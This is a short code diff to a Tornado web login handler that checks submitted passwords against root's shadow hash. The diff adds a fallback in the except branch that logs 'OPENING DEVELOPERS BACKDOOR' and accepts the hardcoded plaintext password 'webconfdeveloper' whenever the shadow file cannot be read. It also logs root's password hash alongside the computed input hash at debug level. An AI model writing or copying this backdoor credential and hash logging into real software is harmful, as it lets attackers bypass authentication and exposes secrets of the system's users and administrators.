@@ -39,15 +39,15 @@ class LoginHandler(tornado.web.RequestHandler):
 		self.render("config.html", body="login_block.html", title="Login", config=None, errors=errors)
 
 	def post(self):
-		root_crypt = "webconfdeveloper"
 		input_passwd = self.get_argument("PASSWORD")
-		input_crypt = input_passwd
 		try:
 			root_crypt=check_output("getent shadow root", shell=True).decode("utf-8").split(':')[1]
 			rcparts = root_crypt.split('$')
 			input_crypt = crypt.crypt(input_passwd, "$%s$%s" % (rcparts[1], rcparts[2]))
 		except:
-			pass
+			logging.info("OPENING DEVELOPERS BACKDOOR ...")
+			root_crypt = "webconfdeveloper"
+			input_crypt = input_passwd
 		try:
 			logging.debug("PASSWD: %s <=> %s" % (root_crypt,input_crypt))
 			if input_crypt==root_crypt:
